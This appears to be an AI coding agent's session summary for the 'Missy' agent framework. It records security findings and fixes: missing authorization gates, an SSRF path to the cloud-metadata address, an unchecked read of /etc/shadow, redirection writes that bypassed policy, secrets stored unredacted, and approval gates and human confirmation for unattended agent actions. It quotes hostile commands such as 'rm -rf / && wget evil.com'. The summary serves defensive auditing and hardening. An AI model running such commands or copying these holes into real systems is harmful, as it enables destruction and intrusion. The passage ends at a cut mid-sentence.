# LAST_SESSION_SUMMARY

Date: 2026-07-10

Branch: `overhaul/missy-validation-20260710-031406`
Draft PR: https://github.com/MissyLabs/missy/pull/31

## Changed (36 checkpoints this session, full suite green after every one)

### FX-A through FX-G (validation-harness root causes) — condensed, full detail in BUILD_STATUS.md

1. Preserved/hardened the existing `voice_commands.py` fix (real trailing-comma parsing bug found and fixed).
2. **FX-A**: forced the acpx delegate provider through Missy's structured tool protocol (zero native tools, fail-closed permissions, isolated cwd, delegation envelope, leaked-marker defense). Dominant root cause behind ~30 of 43 failing validation cases.
3. **FX-B**: fixed the production memory backend mismatch — Discord conversation turns were being written to the wrong file (JSON store instead of `SQLiteMemoryStore`); identical bug found independently in `VisionMemoryBridge`.
4. **FX-D**: explicit structural current-turn boundary in the acpx prompt + fail-closed on fabricated delegate responses.
5. **FX-C**: grounded memory-ID lookups (exception vs. genuinely missing); confirmed Incus tools are fabrication-proof at the tool layer.
6. **FX-F bullet 1**: browser error classification (tool absence vs. installation vs. sandbox/kernel failure vs. real interaction error).
7. **FX-G**: safe upper bound on acpx timeout config + explicit "outcome is UNKNOWN, verify before retry" messaging. Process-group cleanup attempted but reverted (broke ~136 tests mocking `subprocess.run`) — task #17.

**All of FX-A through FX-G are now done** per the prompt's stated dependency order.

### Eighteen independent, confirmed critical security vulnerabilities (full detail in AUDIT_SECURITY.md)

Found via the same systematic audit against `~/Missy-security-review.md`. Five are "an unauthenticated/unrestricted action reachable due to a missing gate"; the rest are variations — declared tool metadata not matching reality, a security check applied asymmetrically, enforcement narrower than its own declared scope, a persistence/audit path bypassing a guarantee, or a side effect happening before its governing check.

1. **SR-1.2/1.3**: unauthenticated code-evolution self-approval (system prompt taught self-approval; Discord emoji-reaction approval had zero auth check).
2. **SR-1.12**: Discord DM-pairing self-approval bypass (any unpaired stranger, two messages, zero auth).
3. **SR-1.13 (two findings)**: Discord message-command and slash-command ingress both lacked authorization; slash commands also had cross-user session-bleeding (`session_id="discord"` hardcoded for everyone).
4. **SR-1.8**: `ShellPolicyEngine` treated an empty `allowed_commands` list as allow-all whenever `shell.enabled: true`, contradicting its own docstring and all docs. A pre-existing test asserted `rm -rf / && wget evil.com` passed policy under the default config.
5. **SR-1.5**: Incus tools' declared shell permission checked a meaningless dummy string (or, for `incus_exec`, the *guest* command) instead of the real `incus` host binary. Live-reproduced: `incus_exec(command="bash")` with only `"bash"` allowlisted ran the real host `incus exec ... -- bash -c bash`, `incus` never being authorized. Fixed via new `BaseTool.resolve_shell_command()`/`resolve_filesystem_targets()` hooks — a general mechanism, not a one-off patch.
6. **SR-1.6 (crown-jewel bypass)**: `BrowserNavigateTool` called Playwright directly, never routing through `PolicyHTTPClient`/the network policy engine. Live-reproduced: navigating to the cloud-metadata SSRF address `169.254.169.254` passed the registry's permission check with zero denial. Fixed with a `resolve_network_hosts()` hook (registry-level) plus a Playwright `context.route()` interceptor (catches redirects/subresources/JS-triggered fetches too).
7. **SR-1.4**: same pattern as SR-1.5 in `VisionCaptureTool`/`VisionBurstCaptureTool` — declared filesystem permissions but read/write targets (`source`/`save_path`/`device`) didn't match the registry's kwarg heuristic. Live-reproduced: `vision_capture(source="/etc/shadow", ...)` actually called `cv2.imread("/etc/shadow")` with zero policy check. Fixed by reusing SR-1.5's hooks.
8. **SR-1.9a**: `NetworkPolicyEngine`'s exact-hostname/domain-suffix matches allowed immediately with **zero IP verification** — DNS-rebinding defense only applied to *unmatched* hostnames. Live-reproduced with a resolver rigged to raise on any call: an allowlisted hostname passed with the resolver never invoked. Fixed by applying the same rebinding check uniformly. Also caught+fixed a real test-suite performance regression the fix introduced (6 Hypothesis tests doing unmocked live DNS, 75s→383s for affected dirs) and one real full-suite failure (a test hostname resolving via live DNS to an ICANN sentinel loopback address).
9. **SR-1.7**: `ShellPolicyEngine` only validated program names — redirection operators were never routed through the filesystem policy. Live-reproduced through the real production `shell_exec` tool: with only `"echo"` allowlisted and no write paths allowed, `echo pwned > /tmp/.../pwn.txt` **actually wrote the file to disk**. Fixed by tokenising redirect targets with POSIX-punctuation-aware `shlex` and routing them through the filesystem engine. Also found+fixed a pre-existing bug in the same code: `2>&1` was misparsed as a fake sub-command, denying that common idiom outright.
10. **SR-1.10**: `AuditLogger` wrote every event's `detail` to disk completely unredacted — display-time-only redaction elsewhere "can't repair what's already on disk." Live-reproduced: a bearer token, an AWS presigned-URL signature, and a Google-API-key-shaped URL value all appeared in plaintext in the on-disk JSONL file. Fixed with a recursive `_redact_detail()` applied at the single audit-write choke point, plus the two token-shape patterns (`bearer_token`, `basic_auth_header`, `aws_presigned_signature`) the review named explicitly.
11. **SR-1.11**: `McpManager._save_config()` rebuilt every config entry purely from live client state (`name`/`command`/`url`), silently dropping any pinned `digest`. Live-reproduced: pinned a digest, simulated a restart — the `digest` key was completely gone afterward. Fixed by having `_save_config()` recover and preserve each server's currently pinned digest from the existing on-disk config before rewriting.
12. **SR-2.4 (first §2 item — unattended-execution hazards)**: `_rewrite_heredoc_command()` wrote a model-supplied `shell_exec` heredoc body to a real temp file *before* the shell policy check. Live-reproduced: a heredoc body reading `SUPER_SECRET_TOKEN` from the environment was written to `/tmp/missy_heredoc_*.py` unconditionally, and never deleted. Fixed: interpreter now checked against real shell policy before anything is written; temp file cleaned up in a `finally` block regardless of outcome.
13. **SR-2.3**: `_tool_loop()` resolves the per-turn visible tool set once and presents it to the provider, but `_execute_tool()` — the function that actually dispatches every tool call — checked nothing against that resolved set. Live-reproduced: with `capability_mode="safe-chat"` correctly excluding `shell_exec` from the visible set, calling `_execute_tool()` directly with a `shell_exec` call still dispatched successfully. Fixed: `_tool_loop()` now threads the exact resolved `allowed_tool_names` set into every `_execute_tool()` call.
14. **SR-3.4 (first §3 item — data-integrity/availability)**: `_tool_loop()` called the paid `provider.complete_with_tools()` first and only checked budget afterward. Separately, `_single_turn()` never called `_check_budget()` at all. Live-verified both defects, then fixed by checking budget at the top of each loop iteration and adding the same check to `_single_turn()` on both sides of its call.
15. **SR-3.2 (second §3 item)**: `Summarizer._call_llm()` called `self._provider.chat(...)`, a method no provider implements (`BaseProvider` only defines `complete()`/`complete_with_tools()`). Tiers 1 and 2 of `_escalate()` raised `AttributeError` on every call, silently caught, always falling through to Tier 3 — which truncates the *prompt template string*, so every persisted "summary" in production was mostly boilerplate instruction text, not real content. Root cause of non-detection: all 3 affected test files mocked the provider as a bare `MagicMock()` with no `spec`, which auto-vivifies `.chat` instead of raising `AttributeError` like a real provider would. Live-reproduced with `MagicMock(spec=["complete", "complete_with_tools", "is_available", "name"])`: `tier_counts: {'normal': 0, 'aggressive': 0, 'fallback': 1}`, `provider.complete.called == False`. Independently re-verified the review's other two named sub-bugs against current code rather than assuming — both `_format_turns()`'s `timestamp[:19]` slicing and `compact_session()`'s `memory_store` method calls are already correct on current code, likely as a side effect of FX-B; marked "no longer applicable" rather than re-fixed. Fixed: `_call_llm()` now calls `self._provider.complete(messages, temperature=temperature, max_tokens=4096)`; corrected the stale docstring; switched all provider mocks in the 3 affected test files (plus a `FakeProvider` rename in a 4th) to `MagicMock(spec=BaseProvider)` / a real `.complete()` method, closing the mock-masking hole at its source so this class of bug can't recur silently. Live re-verified: `tier_counts: {'normal': 1, ...}`, real summary text returned. 2 new regression tests, one of which is a standalone sanity check that the `spec=BaseProvider` guard actually enforces the interface.
16. **SR-3.3 (third §3 item)**: started as a "verify before fixing" checkpoint (flagged as possibly already resolved by FX-B) but found something worse than the review's text anticipated — two independent stacked bugs meant `memory_search`/`memory_describe`/`memory_expand` had never worked in production, in any configuration, for any call. Bug 1: none of the three tools declared the `permissions: ToolPermissions` attribute `ToolRegistry._check_permissions()` requires (they carried vestigial, unused attributes instead) — every dispatch through the real registry crashed with `AttributeError` before the tool's own logic ran. Bug 2: even with that fixed, `AgentRuntime._execute_tool()` never injected the `_memory_store`/`_session_id` kwargs these tools read — dispatch would still return "Memory store is not available." Root cause of non-detection: every existing test called `tool.execute(_memory_store=store, ...)` directly, bypassing both bugs — no test had ever dispatched these tools through the real registry or runtime. Severity: `_intercept_large_content()` explicitly promises the model "Use memory_search or memory_expand to retrieve full content" after every large-tool-output truncation — a promise the runtime could never keep. Live-reproduced end-to-end via the real `AgentRuntime._execute_tool()` method: `memory_expand` on a real stored record returned `is_error=True`, "Tool execution failed due to an internal error." Confirmed via `git stash` on the pre-fix tree. Fixed: added `permissions = ToolPermissions()` to all three tools; added a `_MEMORY_RETRIEVAL_TOOL_NAMES` injection block in `_execute_tool()` mirroring the existing SR-2.4 heredoc special-case pattern, supplying `_memory_store`/`_session_id` for these three tool names only. Live re-verified all three tools now work, and `memory_search` correctly defaults to the calling session only (not all sessions) when the model omits `session_id`, while still honoring an explicit override for intentional cross-session lookups (documented, opt-in, not a leak). 10 new regression tests across two files, including dispatch through both the real `ToolRegistry` and the real `AgentRuntime._execute_tool()`.
17. **SR-3.5 (fourth §3 item, this checkpoint, closes §3)**: another "verify before fixing" checkpoint — this time the literal ask ("remove non-atomic full-file memory rewrites from production paths") turned out to already be true (`MemoryStore._save()`'s non-atomic write has 3 production construction sites, none of which ever call a write method), but the investigation found 3 unrelated, live, confirmed bugs at those same 3 call sites, all sharing FX-B's root cause. Bug 1: `summarize_session.py`'s built-in skill read from the legacy JSON `MemoryStore` instead of the production `SQLiteMemoryStore` — since FX-B moved real writes to SQLite, this always returned "no turns recorded" regardless of actual history. Bug 2: `scheduler/manager.py::cleanup_memory()` and the documented CLI command `missy sessions cleanup` both guarded their cleanup call with `hasattr(store, "cleanup")` against `MemoryStore()`, which has no such method — both always silently no-op'd, forever, in every configuration; the CLI even printed "use SQLiteMemoryStore" while a different command in the same file already correctly used it. Root cause of non-detection: every affected test patched `MemoryStore` with a bare `MagicMock()`, which auto-vivifies `.cleanup` — `hasattr()` was always `True` in tests, always `False` in production; one test suite even explicitly encoded the bug's symptom as correct, expected behavior. Fixed: switched all 3 call sites to `SQLiteMemoryStore()`; fixed `summarize_session.py`'s `_format_turns()` (assumed a `datetime` object matching the old store, crashes on the new store's `str` timestamp — now uses `[:19]` slicing matching the pattern used elsewhere in the codebase); removed the dead `hasattr` guards entirely. Deleted 3 tests that encoded the old broken behavior as correct; updated remaining tests' patch targets. Added 3 new regression tests using a **real** `SQLiteMemoryStore` against a real temp DB (not mocks) per fixed call site, confirming actual data is retrieved/deleted. Corrected a stale "the default" claim in `missy/memory/__init__.py`'s docstring.

### Two product-policy decisions this session: SR-2.1 and SR-2.2 (closes §2 of the security review)

#### SR-2.1 (scheduled jobs' default capability_mode)

Unlike every finding above, SR-2.1 was not a mechanical bug — it's a
genuine product-policy default-value question the review itself framed
that way. Asked and confirmed with the operator before implementing,
per prompt.md's requirement not to silently change defaults affecting
existing deployments: **scheduled jobs should default to a restricted
`capability_mode`, not `"full"`.**

Reachability: `SchedulerManager._run_job()` constructed
`AgentConfig(provider=job.provider)` with no `capability_mode`
override, so every scheduled job ran with the class default (`"full"`)
— the same tool access as an interactive session, but completely
unattended, on a timer, with no human in the loop to catch a bad
action. `ScheduledJob` had no `capability_mode` field at all.

Fixed: added `ScheduledJob.capability_mode: str = "safe-chat"`
(round-tripped through serialization; a legacy `jobs.json` record
missing the field, or one with an unrecognized value, falls back to
`"safe-chat"`, never `"full"` — fail closed, absence of an explicit
value must not imply the most permissive option). Added
`SchedulerManager.add_job(capability_mode=...)` with validation
against `("full", "safe-chat", "no-tools")` (deliberately excludes
`"discord"`, a channel-specific mode). `_run_job()` now threads
`job.capability_mode` into `AgentConfig`. Added `missy schedule add
--capability-mode` (default `safe-chat`) and a `Mode` column in
`missy schedule list`. Live-verified end-to-end through a real
`SchedulerManager`: a default-created job's `_run_job()` constructs
`AgentConfig` with `capability_mode="safe-chat"`; an explicitly-`"full"`
job retains full access through the same call path. 20 new tests.

**Residual risk, called out explicitly (not hidden):** this changes
behavior for any existing deployment with scheduled jobs already
relying on implicit `"full"` access — those jobs lose shell/filesystem-
write/browser access on upgrade unless the operator explicitly re-adds
them with `--capability-mode full` (no `missy schedule edit` command
exists yet to change an existing job in place). This is a deliberate,
confirmed trade-off, not an oversight — should be called out in release
notes if this branch ships.

#### SR-2.2 (proactive trigger confirmation gating — closes §2)

Second and final §2 question, operator-confirmed: **proactive triggers
should default to requiring confirmation, with a real `ApprovalGate`
wired in** (not auto-run-by-default-with-better-auditing, not
disable-proactive-by-default — both alternatives were explicitly
declined).

Reachability, two independent gaps sharing SR-2.1's exact root pattern
(mechanism existed, was disconnected from production): (1)
`ProactiveTrigger.requires_confirmation` and its config-schema
equivalent (`ProactiveTriggerConfig`, both the dataclass default and
the raw-YAML parse default) all defaulted to `False` — the gating logic
in `_fire_trigger()` was already correctly implemented and fail-closed
(denies with `reason: "no_approval_gate"` when required but no gate is
attached), but no trigger ever reached that check by default. (2)
`ApprovalGate` (`missy/agent/approval.py`) was a fully real, tested
class with **zero** production construction sites anywhere in the
codebase (`grep -rn "ApprovalGate(" missy/` matched only its own
docstring example) — `ProactiveManager` was constructed in `cli/main.py`'s
`gateway start` with no `approval_gate` argument at all. Separately,
the existing `missy approvals list` CLI command was a **hardcoded dead
stub** that always printed "No active gateway session" regardless of
whether one existed — approval state lives in-process inside the
`missy gateway start` process, and a fresh CLI invocation is a separate
process with no way to reach that in-memory state directly.

Fixed: flipped both `requires_confirmation` defaults to `True`.
Constructed a real, process-shared `ApprovalGate` in `cli/main.py`'s
`gateway start` (before both the `ProactiveManager` and Web API server
construction sites), wired into both. Added
`ApprovalGate.approve_by_id()`/`.deny_by_id()` for clean REST semantics
alongside the existing free-text `handle_response()`. Added 3 new
authenticated REST endpoints on the already-running Web API server
(`GET /api/v1/approvals`, `POST .../approve`, `POST .../deny`, following
the exact routing/auth pattern already used for `/controls`) — this is
the actual mechanism making cross-process approval possible. Rewrote
`missy approvals list` (previously the dead stub) and added `missy
approvals approve/deny ID`, making real authenticated HTTP calls
against these endpoints, reading the persisted web-console key the same
way other CLI commands already do. Live-verified end-to-end via real
HTTP requests against a real running `ApiServer` with a real
`ApprovalGate`: a request blocked in a background thread on
`gate.request(...)` appears via the list endpoint, and the
approve/deny endpoints genuinely unblock/deny it. Separately
live-verified the `cli/main.py` wiring itself by patching
`ProactiveManager` to capture its constructor kwargs during a real
`gateway start` invocation and asserting `approval_gate` is a genuine
`ApprovalGate` instance, not `None`.

Fixed 23 pre-existing tests across 6 files whose real purpose was
testing cooldown/template-rendering/callback-firing logic (not
confirmation gating itself) and implicitly relied on the old `False`
default to reach the callback at all — added `requires_confirmation=False`
to those constructions/shared test factories; the small number of
tests genuinely *about* confirmation gating already passed `True`
explicitly and were unaffected. 30+ new/updated regression tests
overall.

**Residual risk, called out explicitly:** no Web TUI browser page
exists yet for approvals — the REST endpoints are real and
authenticated, but an operator currently uses the CLI or a raw HTTP
client rather than clicking through the browser console (out of scope
for "wire a real ApprovalGate," not "build a full approval UI"). Same
existing-deployment behavior-change trade-off as SR-2.1 (mitigated the
same way: explicit `requires_confirmation: false` per trigger in
config to opt back into auto-run) — should be called out in release
notes alongside SR-2.1's note if this branch ships.

### SR-3.4 residual: CostTracker cross-session aggregation (closes the last open §2/§3 item)

The cross-session-aggregation sub-finding explicitly left open when
SR-3.4's ordering defect was fixed earlier this session — investigated
and closed as its own checkpoint, not a product-policy question, a
genuine live bug.

`AgentConfig.max_spend_usd`'s own inline comment says "per-session
cost cap," and `CostTracker`'s docstrings describe per-session
tracking — but `AgentRuntime.__init__` constructed exactly one shared
`CostTracker` for the runtime's entire lifetime. `_check_budget()`/
`_record_cost()` already threaded `session_id` through as a parameter,
but only ever used it for audit logging, never for scoping
enforcement — the same "declared behavior doesn't match dispatch
behavior" pattern found repeatedly elsewhere this session (SR-1.4/1.5,
SR-3.3). Since `AgentRuntime` is constructed once and shared across
every session it serves in real deployments (`missy gateway start`
builds one runtime for all Discord users, all Web API sessions), this
was live: one session's spend silently blocked every other session
sharing that process. Live-reproduced: session "bob" (zero spend) was
incorrectly denied due to session "alice" exceeding the cap; confirmed
via `git stash` this reproduces on the pre-fix tree.

Fixed: replaced the single `self._cost_tracker` with
`self._cost_trackers: dict[str, CostTracker]` keyed by `session_id`, a
`_cost_tracking_enabled` master switch (preserving the old "tracking
entirely disabled" semantics), and `_get_cost_tracker()`/
`_peek_cost_tracker()` accessors (lazy, thread-safe, bounded at 5,000
tracked sessions with oldest-first eviction — matching the eviction
pattern `CostTracker` itself already uses internally). Updated all 3
real call sites. Live re-verified: alice is still correctly denied
(the earlier SR-3.4 ordering fix is fully preserved), while bob's
independent budget is completely unaffected, confirmed both directly
and end-to-end through `_single_turn()`'s real dispatch path.

7 new regression tests plus 25 pre-existing tests updated across 9
files — the pre-existing tests previously poked a single shared
`runtime._cost_tracker` directly; each was updated case-by-case to
match its real intent (disable-tracking vs. inject-a-specific-mock-
tracker) rather than a blanket mechanical rename.

**Residual risk:** the per-session tracker dict is in-memory only — a
process restart resets accumulated spend to zero (arguably reasonable
for a live budget window, but worth noting: `max_spend_usd` is a
per-session-per-process-lifetime cap, not a durable cross-restart cap).
Durable historical cost data already exists independently via
`SQLiteMemoryStore.record_cost()`/`get_session_costs()` (used by
`missy cost --session`), already correctly per-session-scoped before
this fix and unaffected by it — only the live in-memory *enforcement*
path had the bug.

### SR-4.4 (first §4 item, twenty-second finding this session — "Advertised But Unwired Features")

`missy/agent/done_criteria.py` advertises a "DONE criteria engine," but
grepping every production call site showed only
`make_verification_prompt()` (a static text nudge) was actually wired
in, and only for the branch where the model keeps calling tools.
`is_compound_task()`, `make_done_prompt()`, and the `DoneCriteria`
dataclass are unused dead code. Critically, the *other* branch — where
the model declares `finish_reason == "stop"` and the loop returns
immediately — had zero code-level verification of any kind: no
cross-reference against whether the immediately preceding round of
tool calls actually succeeded. Live-reproduced through the real
`AgentRuntime.run()`/`_tool_loop()`: a `calculator` tool call that
errored, immediately followed by the model claiming `"Done! I
successfully computed the result."` with `finish_reason="stop"`, was
returned as final output with zero rejection and zero audit trail.

Fixed: added a deterministic completion gate in `_tool_loop()`. First
design reused `_mutation_fp_errors` (fingerprint-keyed error history)
as the signal, but live-testing a corrected-retry scenario (error, then
a later successful retry with different arguments) revealed this never
clears the original fingerprint's error — causing permanent
false-positive rejections even after genuine recovery. Redesigned
around `_last_round_errors`, overwritten (not accumulated) every round,
reflecting only the immediately preceding round's `ToolResult.is_error`
outcomes. A "stop"/"length" claim is now rejected when that list is
non-empty, up to `_MAX_DONE_VERIFICATION_RETRIES = 2` times — the model
is told which call(s) errored and to retry or explain, and the loop
continues. Each rejection emits `agent.done_criteria.rejected` (deny);
if retries exhaust with the error still unresolved, the response is
still returned (never silently rewritten) but tagged
`agent.done_criteria.unverified` (warn) so the gap stays visible.
Live-verified all three cases: unresolved error rejected twice then
accepted-with-warning; genuinely successful round never triggers
rejection or extra provider calls (zero happy-path change); error
followed by a later successful retry is accepted immediately on the
next "done" claim. Corrected `done_criteria.py`'s module docstring to
state plainly what's wired versus dead code. Fixed 5 pre-existing tests
across 4 files (additional mocked provider responses for the new
bounded retry; assertions preserved). Added 3 new regression tests in
`tests/agent/test_runtime_deep.py::TestDoneCriteriaEnforcement`.

**Residual risk, called out explicitly:** `is_compound_task()`,
`make_done_prompt()`, and `DoneCriteria` remain unused — a genuinely
different, softer feature (model self-declares completion conditions
upfront) not required to close the "false completion claims trusted
unconditionally" gap, which this checkpoint's code-level
`ToolResult.is_error` gate closes on its own. Also unaddressed: the
gate only catches errors from tool calls the model actually made — a
model that fabricates a success claim without calling any tool at all
is not caught here; that's the broader FX-C-style "ground factual
claims" pattern, addressed for specific subsystems (memory IDs, Incus
state) but not generically solved by this checkpoint.

### SR-4.5 (second §4 item, twenty-third finding this session)

Product-policy decision, asked and confirmed with the operator:
`self_create_tool` writes agent-authored scripts to
`~/.missy/custom-tools/`, and both its own docstring/success message
and `docs/implementation/module-map.md` claimed those scripts were
"registered"/"created" as usable tools. `grep -rn
"custom-tools\|CUSTOM_TOOLS_DIR" missy/` confirmed this is false —
nothing anywhere in the codebase scans that directory or registers its
contents into the live `ToolRegistry`; a written script can never
actually be called, in any configuration, ever, but the model (and an
operator reading `missy` output) was told otherwise, and `action="list"`
reinforced the illusion by showing it as an existing capability.

Asked whether to build the full secure dynamic-loading lifecycle (an
`ApprovalGate` step, policy-validated permissions, sandboxed execution,
then registration) or keep the feature proposal-only and just fix the
dishonest messaging. **Operator chose proposal-only** — real dynamic
loading means agent-authored code becomes auto-executable, a
meaningfully larger security surface than any other tool in this
codebase, where every other tool's code is first-party and reviewed
pre-deployment.

Fixed: rewrote every user-facing string this tool returns to say
"proposal"/"written for review," never "created"/"registered" — module
docstring, `description` schema field, `list`'s header/empty-state
message, `create`'s success message (now explicitly states "This is
NOT a registered or callable tool"), `delete`'s messages. Corrected
`docs/implementation/module-map.md`'s one-line description and added
an explicit disclaimer paragraph to `docs/security.md`. Live-verified
via the real `SelfCreateTool` class: both `create` and `list` output
now explicitly disclaim registration/callability, and a post-fix grep
re-confirmed no loader was accidentally introduced. Updated 3
pre-existing test files' string assertions to track the intentionally
changed wording (`"No custom tools"` → `"No custom tool proposals"`) —
no assertion was weakened, only the literal matched substring updated.

**Residual risk, called out explicitly:** no security gap remains from
this specific finding. The underlying "should Missy support real
agent-authored tools" product question remains open and intentionally
unbuilt — if pursued later, this checkpoint documents the minimum bar
in `AUDIT_SECURITY.md`'s `SR-4.2 (SR-4.5)` section.

### SR-4.3 (third §4 item, twenty-fourth finding this session)

Unlike SR-4.5, the review's "...or stop advertising recovery"
alternative was rejected in favor of building the real feature —
resuming a checkpoint doesn't expand what's callable, it only continues
something already fully authorized, through the exact same per-call
policy enforcement as any fresh run. No product-policy question needed
asking here; this was a mechanical "the mechanism exists but nothing
consumes it" gap, same shape as several earlier findings this session.

`CheckpointManager.classify()` labels checkpoints
`"resume"`/`"restart"`/`"abandon"` by age, and `missy recover`'s output
table displayed exactly that recommendation — but a grep for every
plausible resume entry point (`\.resume(`, `def resume`,
`restore_checkpoint`, `resume_checkpoint`, `load_checkpoint`) across
`missy/` matched nothing relevant (only an unrelated
`SchedulerManager.resume_job()`, which pauses/resumes *scheduled jobs*,
a different feature entirely). `AgentRuntime` had no method that ever
read a checkpoint's persisted `loop_messages`/`iteration` back and
continued the tool loop — the only real action `missy recover` could
take was `--abandon-all`. Confirmed the write path is safe to resume
from before building anything: `_tool_loop()` only calls
`_cm.update(...)` *after* a full round's tool calls and their results
are all appended to `loop_messages`, never mid-call, so every saved
checkpoint represents a safe boundary (no tool call can ever be
replayed by feeding the saved messages into a fresh provider call).

Fixed: added `CheckpointManager.get(id)` (single-row lookup in any
state — `get_incomplete()` only returns `RUNNING` rows, but resume
needs to distinguish "not found" from "found but already
terminal") and `validate_loop_messages()` (a conservative schema gate:
must be a non-empty list of dicts; each `role` must be a recognized
value; `tool` entries need `name`/`content`; `assistant` `tool_calls`
entries need `name` — rejects anything that doesn't look exactly like
what `_tool_loop()` itself writes). Added
`AgentRuntime.resume_checkpoint(checkpoint_id)`: fails closed with
`ValueError` if not found or not `RUNNING`; fails closed with a new
`CheckpointCorruptedError` (checkpoint marked `FAILED` first, so it's
never offered for resume again) if `loop_messages` fails validation;
otherwise re-resolves both the system prompt (persona/behavior/memory-
synthesis may have changed) and the tool set
(`_get_tools()`, under the *current* `capability_mode`/`tool_policy` —
this is the policy-revalidation step, requiring zero special-case code
since every tool call already goes through
`ToolRegistry._check_permissions()` on every dispatch, resumed or not)
before handing the saved `loop_messages` straight to the real
`_tool_loop()`. The old checkpoint is marked `COMPLETE` immediately
after its data is validated and handed off — before the resumed
`_tool_loop()` runs, so a concurrent `missy recover --resume` on the
same ID cannot double-resume it; the resumed run gets its own new
checkpoint via `_tool_loop()`'s existing internal create/complete/fail
calls, unaffected by this change. Added `missy recover --resume ID`
(plus `--provider` to override), wired to the new method, with the
CLI's own "recommended action" hint text updated to mention it.

Live-verified end-to-end via a real `CheckpointManager` (isolated
`HOME`, real SQLite, zero mocks on the checkpoint side) plus a mocked
provider: (1) happy path — a checkpoint holding one completed
`calculator` round resumes to a genuine "The answer is 4." response,
the saved messages are actually what was sent to the provider (not
discarded/rebuilt from scratch), and the old checkpoint transitions to
`COMPLETE`; (2) a non-existent checkpoint ID raises `ValueError`,
provider never called; (3) a `COMPLETE`-state checkpoint raises
`ValueError` ("not resumable"), provider never called; (4) corrupted
`loop_messages` — both invalid JSON (which `_row_to_dict()`'s existing
exception handling silently degrades to `[]`, now correctly rejected
since empty lists are invalid) and valid-JSON-wrong-shape (a list of
bare strings instead of message dicts) — raises
`CheckpointCorruptedError` and marks the checkpoint `FAILED`, provider
never called; (5) a checkpoint resumed under
`capability_mode="no-tools"` genuinely receives an empty tool list in
the actual provider call, confirming policy revalidation is live
behavior, not just a claim in a docstring. Corrected
`docs/implementation/module-map.md`'s checkpoint entry (the claim
"Enables `missy recover` to resume incomplete sessions" is now true
instead of aspirational; also fixed a wrong "Key exports" line that
named a nonexistent `Checkpoint` class instead of the real
`CheckpointManager`) and `CLAUDE.md`'s CLI command table.

24 new regression tests: `tests/agent/test_checkpoint.py` (`TestGet`,
`TestValidateLoopMessages`), `tests/agent/test_runtime_deep.py`
(`TestResumeCheckpoint`, 6 tests against the real resume path),
`tests/cli/test_cost_recover.py` (`TestRecoverResume`, 4 tests).
`tests/agent/`+`tests/cli/`+`tests/unit/`+`tests/security/`+
`tests/scheduler/` (9,853 tests) pass with no regressions.

**Residual risk, called out explicitly:** the total iteration budget
resets to `max_iterations` on resume rather than continuing the
original run's counter (e.g. a task interrupted at iteration 8 of 10
gets a fresh 10 after resume, not 2) — a deliberate simplification, not
a safety gap, since it only ever grants a resumed task *more* room to
finish, never less, and every additional iteration still goes through
identical per-call policy/budget enforcement. No automatic/scheduled
resume exists — an operator must run `missy recover --resume ID`
manually; `ProactiveManager` does not retry interrupted tasks on its
own (out of scope for this finding, which was about the resume
mechanism existing at all, not about triggering it automatically).

### SR-4.2 (fourth §4 item, twenty-fifth finding this session)

Product-policy decision, asked and confirmed with the operator: wire
sub-agent delegation into production with real limits, rather than
document the feature as unavailable (the review's stated alternative).
`missy/agent/sub_agent.py`'s `SubAgentRunner`/`parse_subtasks` had zero
production call sites anywhere — completely unreachable dead code, no
tool/CLI/runtime construction site existed at all. Worse, its claimed
concurrency was fake: `run_all()` was a plain sequential for-loop
despite `SubAgentRunner.__init__` constructing an unused
`threading.Semaphore(MAX_CONCURRENT)` — nothing ever contended on it
because nothing ran concurrently. It also had no cross-child budget
aggregation (each subtask got a wholly independent `AgentRuntime` via a
`runtime_factory` callable, each with its own from-scratch cost
tracker, so a sub-agent's spend could never be checked against the
parent's `max_spend_usd` cap) and no recursion-depth guard at all.

Fixed: redesigned `SubAgentRunner` to reuse a *shared*
`runtime`/`session_id`/`depth` across every subtask instead of a
factory — this single change makes budget aggregation work for free,
since every subtask now hits `_get_cost_tracker(session_id)` on the
exact same `AgentRuntime` instance, returning the exact same
`CostTracker` object (the SR-3.4 residual mechanism from earlier this
session). `run_all()` now schedules dependency-ordered "waves" via a
real `concurrent.futures.ThreadPoolExecutor(max_workers=MAX_CONCURRENT)`
— every task in a wave (all dependencies already satisfied) genuinely
runs in parallel; a task with an unmet dependency waits for the next
wave. `run_subtask()` kept its own semaphore acquire too, as
defense-in-depth for any caller invoking it directly rather than
through `run_all()`'s pool. Added `MAX_SUB_AGENT_DEPTH = 2`, threaded
as an *explicit* parameter down `AgentRuntime.run()` → `_run_loop()` →
`_tool_loop()` → `_execute_tool()` — deliberately not a
`threading.local`/`contextvars.ContextVar`, since values in those don't
reliably propagate into a new OS thread spawned by
`ThreadPoolExecutor` without manual `copy_context()` plumbing; an
implicit-propagation approach here would have been a silent way for
the depth guard to be bypassed under the very concurrency this
checkpoint was adding. Added a new `delegate_task` tool
(`missy/tools/builtin/delegate_task.py`), dispatched through
`_execute_tool()`'s existing kwarg-injection pattern (mirroring SR-3.3's
memory-store injection): `_runtime`, `_session_id`, `_depth` are all
injected, none model-suppliable. The tool refuses immediately (no
provider call attempted) at `_depth >= MAX_SUB_AGENT_DEPTH` or with no
runtime context.

Live-verified end-to-end with no mocks on the timing-sensitive
assertions: (1) three independent subtasks, each simulating a 0.3s
provider call, finished in ~0.37s total via the real `SubAgentRunner`
against a real `AgentRuntime`, with call-start timestamps within 0.6ms
of each other — genuine parallelism, not a sequential loop dressed up
with an unused semaphore; (2) a sequential (`then`-chain) delegation
under a tight `max_spend_usd` cap correctly raised
`BudgetExceededError` on the second dependent step once the first
step's spend had been recorded against the shared session's tracker;
(3) `delegate_task` at the depth limit refuses via the real registered
tool with zero provider calls. Corrected `CLAUDE.md`'s stale
`SubAgentRunner` description ("Spawns child agent instances" — vague
enough to already sound wired, now states the actual production wiring,
shared-runtime budget model, and depth bound) and
`docs/implementation/module-map.md`'s module entry plus a new builtin-
tools table row. 40 new/updated regression tests across 5 files —
`tests/agent/test_sub_agent.py` (rewritten `TestSubAgentRunner` for the
new shared-runtime constructor, plus new `TestRealConcurrency` and
`TestMaxSubAgentDepth` classes), `tests/tools/test_delegate_task.py`
(new file), `tests/agent/test_runtime_deep.py` (new
`TestDelegateTaskDispatch`), and two pre-existing files whose
`SubAgentRunner(runtime_factory=...)` construction no longer compiled
against the new constructor — updated to the shared-runtime API while
preserving each test's original intent.
`tests/agent/`+`tests/tools/`+`tests/cli/`+`tests/unit/`+
`tests/security/` (11,034 tests) pass with no regressions.

**Residual risk, called out explicitly:** concurrent same-wave
sub-agent calls have a real, deliberately-not-hidden TOCTOU race in
budget enforcement — `_check_budget()` runs *before* a provider call
and cost is only recorded *after* it returns, so several subtasks
launched in the same parallel wave can all pass their initial
pre-spend check before any of them has committed spend, letting
